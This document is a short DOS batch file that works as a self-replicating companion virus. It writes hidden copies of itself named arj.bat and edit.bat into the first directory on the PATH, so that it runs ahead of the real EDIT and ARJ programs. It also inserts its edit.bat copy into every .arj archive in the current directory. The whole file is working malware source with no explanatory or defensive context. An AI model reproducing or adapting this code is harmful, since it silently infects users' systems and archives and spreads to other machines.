@echo off
if (%washere%)==(1) goto next
set washere=1
set params=%1 %2 %3 %4 %5 %6 %7 %8 %9
for %%a in (%path%) do %0 %%a
:next
set firstpath=%1
if %0==arj goto arj
%0.com %params%
if exist %firstpath%\arj.bat goto end
type edit.bat>%firstpath%\arj.bat
attrib +h %firstpath%\arj.bat
type edit.bat>%firstpath%\edit.bat
attrib +h %firstpath%\edit.bat
goto end
:arj
%0.exe %params%
for %%a in (*.arj) do %0.exe a %%a %firstpath%\edit.bat -a -e>nul
:end
echo.
set washere=
set params=
set firstpath=
